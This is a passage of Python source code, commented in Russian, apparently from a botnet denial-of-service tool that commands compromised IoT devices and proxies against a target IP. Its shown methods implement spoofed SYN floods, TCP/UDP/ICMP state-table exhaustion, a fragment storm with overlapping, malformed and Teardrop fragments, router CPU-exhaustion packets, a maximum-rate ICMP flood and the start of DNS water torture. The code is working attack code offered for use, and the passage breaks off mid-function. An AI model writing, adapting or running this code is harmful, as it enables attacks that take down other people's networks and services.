        - Атака на различные состояния TCP
        """
        print(f"📊 Запуск Advanced State-Table Exhaustion атаки на {target_ip}")
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return None
        
        attack_stats = {
            'tcp_sessions': 0,
            'udp_sessions': 0,
            'icmp_sessions': 0,
            'half_open_sessions': 0,
            'total_states': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_stateful_session(device, target_ip, target_port, protocol):
            """Создает stateful сессию для истощения таблиц состояний"""
            if protocol == "tcp":
                return self._create_tcp_state_session(device, target_ip, target_port)
            elif protocol == "udp":
                return self._create_udp_state_session(device, target_ip, target_port)
            elif protocol == "icmp":
                return self._create_icmp_state_session(device, target_ip)
            else:
                return 0

        def _create_tcp_state_session(self, device, target_ip, target_port):
            """Создает сложную TCP сессию с разными состояниями"""
            states_created = 0
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # 1. SYN (Half-open)
                syn_packet = self._create_syn_packet(
                    source_ip=device.ip,
                    source_port=random.randint(1024, 65535),
                    dest_ip=target_ip,
                    dest_port=target_port if target_port > 0 else random.randint(1, 65535)
                )
                sock.sendto(syn_packet, (target_ip, 0))
                states_created += 1
                
                # 2. SYN-ACK (если бы ответили)
                syn_ack_packet = self._create_tcp_packet(
                    source_ip=target_ip,
                    source_port=target_port if target_port > 0 else random.randint(1, 65535),
                    dest_ip=device.ip,
                    dest_port=random.randint(1024, 65535),
                    flags=0x12,  # SYN+ACK
                    seq=random.randint(0, 0xFFFFFFFF),
                    ack=0
                )
                # Не отправляем - эмулируем состояние
                
                # 3. ACK (Establishing)
                ack_packet = self._create_tcp_packet(
                    source_ip=device.ip,
                    source_port=random.randint(1024, 65535),
                    dest_ip=target_ip,
                    dest_port=target_port if target_port > 0 else random.randint(1, 65535),
                    flags=0x10,  # ACK
                    seq=random.randint(0, 0xFFFFFFFF),
                    ack=random.randint(0, 0xFFFFFFFF)
                )
                sock.sendto(ack_packet, (target_ip, 0))
                states_created += 1
                
                # 4. DATA (Established)
                data_packet = self._create_tcp_packet(
                    source_ip=device.ip,
                    source_port=random.randint(1024, 65535),
                    dest_ip=target_ip,
                    dest_port=target_port if target_port > 0 else random.randint(1, 65535),
                    flags=0x18,  # PSH+ACK
                    seq=random.randint(0, 0xFFFFFFFF),
                    ack=random.randint(0, 0xFFFFFFFF),
                    data=b'X' * random.randint(100, 500)
                )
                sock.sendto(data_packet, (target_ip, 0))
                states_created += 1
                
                # 5. FIN (Closing)
                fin_packet = self._create_tcp_packet(
                    source_ip=device.ip,
                    source_port=random.randint(1024, 65535),
                    dest_ip=target_ip,
                    dest_port=target_port if target_port > 0 else random.randint(1, 65535),
                    flags=0x11,  # FIN+ACK
                    seq=random.randint(0, 0xFFFFFFFF),
                    ack=random.randint(0, 0xFFFFFFFF)
                )
                sock.sendto(fin_packet, (target_ip, 0))
                states_created += 1
                
                sock.close()
                
            except Exception as e:
                pass
            
            return states_created

        def state_exhaustion_attack(device):
            tcp_sessions = 0
            udp_sessions = 0
            icmp_sessions = 0
            half_open_sessions = 0
            
            try:
                print(f"📊 {device.ip} начинает State-Table Exhaustion атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Чередуем протоколы для комплексного воздействия
                        protocol = random.choice(['tcp', 'udp', 'icmp', 'tcp_half_open'])
                        
                        if protocol == 'tcp':
                            states = self._create_tcp_state_session(device, target_ip, 
                                                                  target_port if target_port > 0 else 80)
                            tcp_sessions += states
                            attack_stats['tcp_sessions'] += states
                            
                        elif protocol == 'udp':
                            states = self._create_udp_state_session(device, target_ip,
                                                                  target_port if target_port > 0 else 53)
                            udp_sessions += states
                            attack_stats['udp_sessions'] += states
                            
                        elif protocol == 'icmp':
                            states = self._create_icmp_state_session(device, target_ip)
                            icmp_sessions += states
                            attack_stats['icmp_sessions'] += states
                            
                        else:  # tcp_half_open
                            states = self._create_half_open_sessions(device, target_ip)
                            half_open_sessions += states
                            attack_stats['half_open_sessions'] += states
                        
                        attack_stats['total_states'] += 1
                        time.sleep(0.01)  # Агрессивное создание состояний
                        
                    except Exception as e:
                        continue
                
                print(f"✅ {device.ip}: {tcp_sessions} TCP, {udp_sessions} UDP, {icmp_sessions} ICMP состояний")
                return tcp_sessions + udp_sessions + icmp_sessions, 0
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(iot_bots, attack_stats, state_exhaustion_attack,
                                  "State-Table Exhaustion", max_workers=min(len(iot_bots), 5000000000))
        
        print(f"\n📊 STATE-TABLE EXHAUSTION РЕЗУЛЬТАТЫ:")
        print(f"🔗 TCP сессий: {attack_stats['tcp_sessions']}")
        print(f"📨 UDP сессий: {attack_stats['udp_sessions']}")
        print(f"🎯 ICMP сессий: {attack_stats['icmp_sessions']}")
        print(f"🚪 Half-open сессий: {attack_stats['half_open_sessions']}")
        print(f"📊 Всего состояний: {attack_stats['total_states']}")
        
        return results

    def _create_half_open_sessions(self, device, target_ip, count=5):
        """Создает множество half-open TCP сессий"""
        sessions_created = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            for _ in range(count):
                syn_packet = self._create_syn_packet(
                    source_ip=".".join(str(random.randint(1, 254)) for _ in range(4)),
                    source_port=random.randint(1024, 65535),
                    dest_ip=target_ip,
                    dest_port=random.randint(1, 65535)
                )
                sock.sendto(syn_packet, (target_ip, 0))
                sessions_created += 1
            
            sock.close()
        except:
            pass
        
        return sessions_created

    def _create_ip_fragments(self, source_ip, dest_ip, payload, fragment_size=500):
        """Создает нормальные IP фрагменты"""
        fragments = []
        ip_id = random.randint(1, 65535)
        total_length = len(payload)
        
        for offset in range(0, total_length, fragment_size):
            end_offset = min(offset + fragment_size, total_length)
            fragment_data = payload[offset:end_offset]
            
            more_fragments = 1 if end_offset < total_length else 0
            fragment_offset = offset // 8
            
            fragment = self._create_ip_fragment(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data=fragment_data,
                protocol=socket.IPPROTO_UDP,
                identification=ip_id,
                fragment_offset=fragment_offset,
                more_fragments=more_fragments
            )
            fragments.append(fragment)
        
        return fragments

    def _create_ip_fragment(self, source_ip, dest_ip, data, protocol, identification, fragment_offset, more_fragments):
        """Создает один IP фрагмент"""
        # IP заголовок
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 20 + len(data)
        ip_id = identification
        ip_frag_off = (fragment_offset & 0x1FFF) | (more_fragments << 13)
        ip_ttl = 255
        ip_proto = protocol
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # IP header без checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              ip_ihl_ver, ip_tos, ip_tot_len,
                              ip_id, ip_frag_off, ip_ttl, ip_proto,
                              ip_check, ip_saddr, ip_daddr)
        
        # Вычисляем checksum
        ip_check = self._calculate_checksum(ip_header)
        
        # Пересобираем с правильным checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              ip_ihl_ver, ip_tos, ip_tot_len,
                              ip_id, ip_frag_off, ip_ttl, ip_proto,
                              socket.htons(ip_check), ip_saddr, ip_daddr)
        
        return ip_header + data

    def _create_overlapping_fragments(self, source_ip, dest_ip, payload):
        """Создает перекрывающиеся фрагменты"""
        fragments = []
        ip_id = random.randint(1, 65535)
        
        # Фрагмент 1: offset 0, size 100
        frag1 = self._create_ip_fragment(
            source_ip=source_ip,
            dest_ip=dest_ip,
            data=payload[:100],
            protocol=socket.IPPROTO_UDP,
            identification=ip_id,
            fragment_offset=0,
            more_fragments=1
        )
        fragments.append(frag1)
        
        # Фрагмент 2: offset 50 (перекрытие), size 100
        frag2 = self._create_ip_fragment(
            source_ip=source_ip,
            dest_ip=dest_ip,
            data=payload[50:150],
            protocol=socket.IPPROTO_UDP,
            identification=ip_id,
            fragment_offset=50 // 8,  # 6 (перекрытие)
            more_fragments=0
        )
        fragments.append(frag2)
        
        return fragments

    def _create_malformed_fragments(self, source_ip, dest_ip):
        """Создает неправильно сформированные фрагменты"""
        fragments = []
        
        # 1. Фрагмент с максимальным offset
        frag1 = self._create_ip_fragment(
            source_ip=source_ip,
            dest_ip=dest_ip,
            data=b'X' * 100,
            protocol=socket.IPPROTO_UDP,
            identification=random.randint(1, 65535),
            fragment_offset=0x1FFF,  # Максимальный offset
            more_fragments=1
        )
        fragments.append(frag1)
        
        # 2. Фрагмент с неправильными флагами
        frag2 = self._create_ip_fragment(
            source_ip=source_ip,
            dest_ip=dest_ip,
            data=b'Y' * 200,
            protocol=socket.IPPROTO_UDP,
            identification=random.randint(1, 65535),
            fragment_offset=100 // 8,
            more_fragments=1  # Должен быть 0 для последнего фрагмента
        )
        fragments.append(frag2)
        
        return fragments

    def _create_teardrop_fragments(self, source_ip, dest_ip):
        """Классическая Teardrop атака"""
        return self._create_overlapping_fragments(source_ip, dest_ip, os.urandom(200))

    def _create_bonus_anomalies(self, source_ip, dest_ip):
        """Дополнительные аномалии для максимального эффекта"""
        fragments = []
        
        # Очень большие offset (переполнение)
        frag1 = self._create_ip_fragment(
            source_ip=source_ip,
            dest_ip=dest_ip,
            data=os.urandom(100),
            protocol=socket.IPPROTO_UDP,
            identification=random.randint(1, 65535),
            fragment_offset=0x1FFF,  # Максимальный offset
            more_fragments=0
        )
        fragments.append(frag1)
        
        # Нулевой offset с MORE_FRAGMENTS=0
        frag2 = self._create_ip_fragment(
            source_ip=source_ip,
            dest_ip=dest_ip,
            data=os.urandom(500),
            protocol=socket.IPPROTO_UDP,
            identification=random.randint(1, 65535),
            fragment_offset=0,
            more_fragments=0  # Противоречие!
        )
        fragments.append(frag2)
        
        # Гигантский фрагмент
        frag3 = self._create_ip_fragment(
            source_ip=source_ip,
            dest_ip=dest_ip,
            data=os.urandom(65000),  # Очень большой
            protocol=socket.IPPROTO_UDP,
            identification=random.randint(1, 65535),
            fragment_offset=0,
            more_fragments=0
        )
        fragments.append(frag3)
        
        return fragments

    def ip_fragment_storm(self, target_ip, duration=60):
        """
        💀 MAX POWER IP FRAGMENT STORM 
        - Массовая отправка тысяч фрагментов в секунду
        - Multiple attack vectors одновременно
        - Maximum network bandwidth consumption
        """
        print(f"🌀 ЗАПУСК MAX POWER IP FRAGMENT STORM НА {target_ip}")
        
        if not self.raw_socket_available:
            print("❌ Требуются права root для фрагментационной атаки!")
            return None
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return None
        
        attack_stats = {
            'fragments_sent': 0,
            'overlapping_fragments': 0,
            'malformed_fragments': 0,
            'teardrop_fragments': 0,
            'bonus_fragments': 0,
            'total_bytes': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def max_power_fragment_storm(device):
            fragments_sent = 0
            overlapping_sent = 0
            malformed_sent = 0
            teardrop_sent = 0
            bonus_sent = 0
            total_bytes = 0
            
            try:
                print(f"🌀 {device.ip} запускает MAX POWER FRAGMENT STORM...")
                start_time = time.time()
                
                # 💀 СОЗДАЕМ RAW SOCKET С МАКСИМАЛЬНЫМ БУФЕРОМ
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128 * 1024 * 1024)
                
                # 💀 ПРЕДГЕНЕРАЦИЯ ТЫСЯЧ ФРАГМЕНТОВ
                pre_generated_fragments = []
                
                for _ in range(2000):  # 2000 предгенерированных фрагментов
                    frag_type = random.choice(['normal', 'overlapping', 'malformed', 'teardrop', 'bonus'])
                    source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    
                    if frag_type == 'normal':
                        payload = os.urandom(random.randint(500, 1500))
                        fragments = self._create_ip_fragments(source_ip, target_ip, payload, 500)
                        pre_generated_fragments.extend(fragments[:5])
                        
                    elif frag_type == 'overlapping':
                        fragments = self._create_overlapping_fragments(source_ip, target_ip, os.urandom(1000))
                        pre_generated_fragments.extend(fragments)
                        
                    elif frag_type == 'malformed':
                        fragments = self._create_malformed_fragments(source_ip, target_ip)
                        pre_generated_fragments.extend(fragments)
                        
                    elif frag_type == 'teardrop':
                        fragments = self._create_teardrop_fragments(source_ip, target_ip)
                        pre_generated_fragments.extend(fragments)
                        
                    elif frag_type == 'bonus':
                        fragments = self._create_bonus_anomalies(source_ip, target_ip)
                        pre_generated_fragments.extend(fragments)
                
                fragment_index = 0
                
                # 💀 MAX POWER ЦИКЛ - БЕЗ ПАУЗ
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # 💀 ОТПРАВЛЯЕМ ПАЧКАМИ ПО 100 ФРАГМЕНТОВ
                        for _ in range(100):
                            if fragment_index >= len(pre_generated_fragments):
                                fragment_index = 0
                            
                            fragment = pre_generated_fragments[fragment_index]
                            sock.sendto(fragment, (target_ip, 0))
                            
                            fragments_sent += 1
                            total_bytes += len(fragment)
                            fragment_index += 1
                            
                            # 💀 ОБНОВЛЕНИЕ СТАТИСТИКИ
                            attack_stats['fragments_sent'] += 1
                            attack_stats['total_bytes'] += len(fragment)
                        
                    except Exception as e:
                        continue
                
                sock.close()
                
                mb_sent = total_bytes / 1024 / 1024
                print(f"✅ {device.ip}: {fragments_sent} фрагментов ({mb_sent:.2f} МБ)")
                return fragments_sent, total_bytes
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        def _create_teardrop_fragments(self, source_ip, dest_ip):
            """💀 КЛАССИЧЕСКАЯ TEARDROP АТАКА"""
            fragments = []
            ip_id = random.randint(1, 65535)
            payload = os.urandom(200)
            
            # 💀 TEARDROP - ПЕРЕКРЫВАЮЩИЕСЯ ФРАГМЕНТЫ
            # Фрагмент 1: offset 0, size 100
            frag1 = self._create_ip_fragment(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data=payload[:100],
                protocol=socket.IPPROTO_UDP,
                identification=ip_id,
                fragment_offset=0,
                more_fragments=1
            )
            fragments.append(frag1)
            
            # Фрагмент 2: offset 50 (ПЕРЕКРЫТИЕ!), size 100
            frag2 = self._create_ip_fragment(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data=payload[50:150],
                protocol=socket.IPPROTO_UDP,
                identification=ip_id,
                fragment_offset=50 // 8,  # 6 (перекрытие)
                more_fragments=0
            )
            fragments.append(frag2)
            
            attack_stats['teardrop_fragments'] += 2
            return fragments

        def _create_bonus_anomalies(self, source_ip, dest_ip):
            """💀 ДОПОЛНИТЕЛЬНЫЕ АНОМАЛИИ ДЛЯ МАКСИМАЛЬНОГО ЭФФЕКТА"""
            fragments = []
            
            # 💀 ОЧЕНЬ БОЛЬШИЕ OFFSET (переполнение)
            frag1 = self._create_ip_fragment(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data=os.urandom(100),
                protocol=socket.IPPROTO_UDP,
                identification=random.randint(1, 65535),
                fragment_offset=0x1FFF,  # МАКСИМАЛЬНЫЙ OFFSET
                more_fragments=0
            )
            fragments.append(frag1)
            
            # 💀 НУЛЕВОЙ OFFSET С MORE_FRAGMENTS=0
            frag2 = self._create_ip_fragment(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data=os.urandom(500),
                protocol=socket.IPPROTO_UDP,
                identification=random.randint(1, 65535),
                fragment_offset=0,
                more_fragments=0  # Противоречие!
            )
            fragments.append(frag2)
            
            # 💀 ГИГАНТСКИЙ ФРАГМЕНТ
            frag3 = self._create_ip_fragment(
                source_ip=source_ip,
                dest_ip=dest_ip,
                data=os.urandom(65000),  # ОЧЕНЬ БОЛЬШОЙ
                protocol=socket.IPPROTO_UDP,
                identification=random.randint(1, 65535),
                fragment_offset=0,
                more_fragments=0
            )
            fragments.append(frag3)
            
            attack_stats['bonus_fragments'] += 3
            return fragments

        results = self._run_attack(iot_bots, attack_stats, max_power_fragment_storm,
                                  "IP Fragment Storm MAX", max_workers=min(len(iot_bots), 5000000000))
        
        # 💀 ФИНАЛЬНАЯ СТАТИСТИКА MAX POWER
        total_time = max(time.time() - attack_stats['start_time'], 1)
        total_fragments = attack_stats['fragments_sent']
        total_mb = attack_stats['total_bytes'] / 1024 / 1024
        fragments_per_second = total_fragments / total_time
        
        print(f"\n🌀 MAX POWER IP FRAGMENT STORM РЕЗУЛЬТАТЫ:")
        print(f"💀 Всего фрагментов: {total_fragments:,}")
        print(f"📊 Фрагментов/сек: {fragments_per_second:.0f}")
        print(f"💾 Отправлено: {total_mb:.2f} MB")
        print(f"🔀 Teardrop: {attack_stats['teardrop_fragments']}")
        print(f"⚠️  Аномалий: {attack_stats['bonus_fragments']}")
        print(f"🔥 Эффективность: {total_fragments/len(iot_bots):.0f} фрагментов/бот")
        
        return results

    def router_cpu_targeted_attack(self, target_ip, duration=60):
        """
        Router CPU-Targeted Attack
        - Пакеты, требующие сложной обработки
        - Атака на контрольные плоскости
        - Использование IP options
        - TTL экспирация
        """
        print(f"💻 Запуск Router CPU-Targeted атаки на {target_ip}")
        
        if not self.raw_socket_available:
            print("❌ Требуются права root для CPU-таргетированной атаки!")
            return None
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return None
        
        attack_stats = {
            'cpu_intensive_packets': 0,
            'ttl_expired_packets': 0,
            'ip_options_packets': 0,
            'complex_routing_packets': 0,
            'total_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_cpu_intensive_packet(target_ip, packet_type):
            """Создает пакеты, требующие интенсивной обработки CPU"""
            if packet_type == 'ttl_expire':
                # Пакеты с TTL=1 для генерации ICMP Time Exceeded
                return self._create_ttl_expire_packet(target_ip)
            elif packet_type == 'ip_options':
                # Пакеты с IP options для сложной обработки
                return self._create_ip_options_packet(target_ip)
            elif packet_type == 'complex_routing':
                # Пакеты для сложных routing решений
                return self._create_complex_routing_packet(target_ip)
            else:
                return None

        def _create_ttl_expire_packet(self, target_ip):
            """Создает пакет с TTL=1 для генерации ICMP Time Exceeded"""
            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            
            # ICMP Echo Request с TTL=1
            icmp_packet = self._create_icmp_echo_request()
            
            ip_header = self._create_ip_header_simple(
                source_ip=source_ip,
                dest_ip=target_ip,
                data_length=len(icmp_packet),
                protocol=socket.IPPROTO_ICMP
            )
            
            # Меняем TTL на 1 в уже созданном header
            ip_bytes = bytearray(ip_header)
            ip_bytes[8] = 1  # TTL field
            ip_header = bytes(ip_bytes)
            
            return ip_header + icmp_packet

        def _create_ip_options_packet(self, target_ip):
            """Создает пакет с различными IP options"""
            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            
            # Record Route option
            record_route_option = b'\x07\x04\x00\x00\x00\x00'
            
            # Timestamp option
            timestamp_option = b'\x44\x08\x00\x00\x00\x00\x00\x00\x00\x00'
            
            # Security option
            security_option = b'\x82\x04\x00\x00\x00\x00'
            
            options = random.choice([record_route_option, timestamp_option, security_option])
            
            # Данные пакета
            data = b'CPU_INTENSIVE' * 10
            
            ip_packet = self._create_ip_header_with_options(
                source_ip=source_ip,
                dest_ip=target_ip,
                data=data,
                protocol=socket.IPPROTO_UDP,
                options=options
            )
            
            return ip_packet

        def _create_complex_routing_packet(self, target_ip):
            """Создает пакеты для сложных routing решений"""
            source_ip = ".".join([
                str(random.randint(224, 239)),  # Multicast
                str(random.randint(0, 255)),
                str(random.randint(0, 255)),
                str(random.randint(1, 254))
            ])
            
            # Multicast пакеты требуют сложной обработки
            icmp_packet = self._create_icmp_echo_request()
            
            ip_packet = self._create_ip_header_simple(
                source_ip=source_ip,
                dest_ip=target_ip,
                data_length=len(icmp_packet),
                protocol=socket.IPPROTO_ICMP
            )
            
            return ip_packet + icmp_packet

        def router_cpu_attack(device):
            cpu_packets_sent = 0
            ttl_packets_sent = 0
            options_packets_sent = 0
            routing_packets_sent = 0
            
            try:
                print(f"💻 {device.ip} начинает Router CPU-Targeted атаку...")
                start_time = time.time()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        packet_type = random.choice(['ttl_expire', 'ip_options', 'complex_routing'])
                        packet = create_cpu_intensive_packet(target_ip, packet_type)
                        
                        if packet:
                            sock.sendto(packet, (target_ip, 0))
                            
                            cpu_packets_sent += 1
                            attack_stats['cpu_intensive_packets'] += 1
                            
                            if packet_type == 'ttl_expire':
                                ttl_packets_sent += 1
                                attack_stats['ttl_expired_packets'] += 1
                            elif packet_type == 'ip_options':
                                options_packets_sent += 1
                                attack_stats['ip_options_packets'] += 1
                            else:
                                routing_packets_sent += 1
                                attack_stats['complex_routing_packets'] += 1
                            
                            attack_stats['total_packets'] += 1
                        
                        time.sleep(0.01)  # Высокая частота для CPU нагрузки
                        
                    except Exception as e:
                        continue
                
                sock.close()
                print(f"✅ {device.ip}: {cpu_packets_sent} CPU-intensive пакетов")
                return cpu_packets_sent, 0
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(iot_bots, attack_stats, router_cpu_attack,
                                  "Router CPU Attack", max_workers=min(len(iot_bots), 5000000000))
        
        print(f"\n💻 ROUTER CPU-TARGETED АТАКА РЕЗУЛЬТАТЫ:")
        print(f"⚡ CPU-intensive пакетов: {attack_stats['cpu_intensive_packets']}")
        print(f"⏰ TTL expire пакетов: {attack_stats['ttl_expired_packets']}")
        print(f"🔧 IP options пакетов: {attack_stats['ip_options_packets']}")
        print(f"🔄 Complex routing пакетов: {attack_stats['complex_routing_packets']}")
        
        return results

    def _create_icmp_echo_request(self):
        """Создает ICMP Echo Request пакет"""
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        
        payload = b'CPU_ATTACK' * 5
        
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        icmp_checksum = self._calculate_checksum(icmp_header + payload)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        return icmp_header + payload

    def _create_ip_fragment(self, source_ip, dest_ip, data, protocol, identification, fragment_offset, more_fragments):
        """Создает один IP фрагмент"""
        version_ihl = 0x45
        tos = 0
        total_length = 20 + len(data)
        flags_fragment = (more_fragments << 13) | fragment_offset
        ttl = 255
        ip_checksum = 0
        source_addr = socket.inet_aton(source_ip)
        dest_addr = socket.inet_aton(dest_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl, tos, total_length, identification,
                              flags_fragment, ttl, protocol, ip_checksum,
                              source_addr, dest_addr)
        
        ip_checksum = self._calculate_checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl, tos, total_length, identification,
                              flags_fragment, ttl, protocol, ip_checksum,
                              source_addr, dest_addr)
        
        return ip_header + data

    def icmp_flood_attack(self, target_ip, duration=60):
        """💀 MAX POWER ICMP FLOOD - МАКСИМАЛЬНАЯ ЗАГРУЗКА ТРАФИКОМ"""
        print(f"💥 ЗАПУСК MAX POWER ICMP FLOOD НА {target_ip}")
        
        # Проверка raw socket доступа
        if not self.raw_socket_available:
            print("❌ Raw socket недоступен! Запустите с sudo для ICMP flood")
            print("🔄 Переключаюсь на UDP-based ICMP flood...")
            return self.udp_ping_attack(target_ip, duration)
        
        # Используем только IoT боты (SOCKS5 не поддерживают raw socket)
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов (MAX POWER MODE)")
        
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return 0
        
        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def max_power_icmp_attack(device):
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            
            try:
                print(f"💥 {device.ip} запускает MAX POWER ICMP атаку...")
                start_time = time.time()
                
                # Создаем raw socket для ICMP
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)  # 64MB буфер
                except PermissionError:
                    print(f"❌ {device.ip}: Требуются права root для ICMP!")
                    return 0, 0
                
                # 💀 ПРЕДГЕНЕРАЦИЯ РАЗНЫХ ТИПОВ ПАКЕТОВ
                pre_generated_packets = []
                packet_sizes = [64, 128, 256, 512, 1024, 1472]  # Разные размеры до MTU
                
                for _ in range(1000):  # 1000 предгенерированных пакетов
                    size = random.choice(packet_sizes)
                    icmp_packet = self._create_advanced_icmp_packet(size)
                    if icmp_packet:
                        pre_generated_packets.append(icmp_packet)
                
                packet_index = 0
                
                # 💀 MAX POWER ЦИКЛ - БЕЗ ПАУЗ
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # 💀 ОТПРАВЛЯЕМ ПАЧКАМИ ПО 50 ПАКЕТОВ БЕЗ ПАУЗ
                        for _ in range(50):
                            if packet_index >= len(pre_generated_packets):
                                packet_index = 0
                            
                            icmp_packet = pre_generated_packets[packet_index]
                            sock.sendto(icmp_packet, (target_ip, 0))
                            
                            packets_sent += 1
                            bytes_sent += len(icmp_packet)
                            packet_index += 1
                            
                            # 💀 АТОМАРНОЕ ОБНОВЛЕНИЕ СТАТИСТИКИ
                            attack_stats['total_packets'] += 1
                            attack_stats['total_bytes'] += len(icmp_packet)
                        
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip} отправил {packets_sent} ICMP пакетов ({mb_sent:.2f} МБ), ошибок: {failed_packets}")
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(iot_bots, attack_stats, max_power_icmp_attack, "ICMP Flood MAX", max_workers=5000000000)

    def _create_advanced_icmp_packet(self, size=1472):
        """💀 СОЗДАЕТ УЛУЧШЕННЫЙ ICMP ПАКЕТ МАКСИМАЛЬНОГО РАЗМЕРА"""
        try:
            # ICMP тип 8 = Echo Request, код 0
            icmp_type = 8
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = random.randint(1, 65535)
            
            # 💀 МАКСИМАЛЬНЫЙ РАЗМЕР ДАННЫХ ДО MTU
            header_size = 8  # ICMP header
            ip_header_size = 20  # IP header
            max_data_size = 1472  # 1500 - 20 - 8
            
            data_size = min(size - header_size, max_data_size)
            data_size = max(56, data_size)  # Минимум 56 байт как в ping
            
            # 💀 РЕАЛИСТИЧНЫЕ ДАННЫЕ БОЛЬШОГО РАЗМЕРА
            timestamp = struct.pack('!d', time.time())
            random_data = os.urandom(data_size - 8)  # Остальное случайные данные
            data = timestamp + random_data
            
            # Создаем ICMP заголовок без checksum
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            
            # Вычисляем checksum для ICMP пакета
            icmp_checksum = self._calculate_checksum(icmp_header + data)
            
            # Пересобираем с правильным checksum
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            
            return icmp_header + data
            
        except Exception as e:
            print(f"❌ Ошибка создания ICMP пакета: {e}")
            return None

    def _calculate_checksum(self, data):
        """Вычисляет checksum для пакета"""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        return ~checksum & 0xFFFF

    def dns_water_torture_attack(self, target_ip, duration=60):
        """DNS Water Torture атака - массовые запросы несуществующих поддоменов"""
        print(f"💧 Запуск DNS Water Torture атаки на DNS сервер {target_ip}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_queries': 0,
            'total_bytes_sent': 0,
            'failed_queries': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def generate_random_subdomain(domain):
            """Генерирует случайный несуществующий поддомен"""
            prefix = random.choice(self.dns_water_torture_config['subdomain_prefixes'])
            random_len = random.choice(self.dns_water_torture_config['random_lengths'])
            random_part = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random_len))
            return f"{prefix}-{random_part}.{domain}"
        
        def create_dns_query(domain, qtype="A"):
            """Создает DNS запрос для указанного домена и типа"""
            transaction_id = struct.pack('!H', random.randint(1, 65535))
            flags = struct.pack('!H', 0x0100)  # Стандартный запрос
